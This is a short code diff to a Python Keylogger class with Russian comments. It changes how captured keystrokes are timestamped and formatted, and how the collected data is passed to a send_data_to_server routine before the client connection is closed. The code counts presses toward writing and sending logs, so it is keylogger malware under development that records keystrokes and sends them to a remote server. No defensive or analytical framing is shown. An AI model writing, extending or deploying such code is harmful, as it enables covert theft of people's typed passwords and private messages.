@@ -68,7 +68,7 @@ class Keylogger:
         except Exception as ex:
             print(f"Something went wrong: {ex}")
 
-        self.send_data_to_server(self._path_to_data_dir)  # отправка данных на сервер
+        self.send_data_to_server()  # отправка данных на сервер
         self._client.close()  # закрытие соединения
 
     
@@ -107,7 +107,7 @@ class Keylogger:
             k: str = str(key).replace("'", "")
             cur_date: str = datetime.date.today().isoformat()  # текущая дата
             cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время
-            keys_logs.append(f'{cur_date}:{cur_time}:{k}\n')
+            keys_logs.append(f'{cur_date}`{cur_time}`{k}\n')
 
             self.press_to_write_count += 1
             self.press_to_send_count += 1
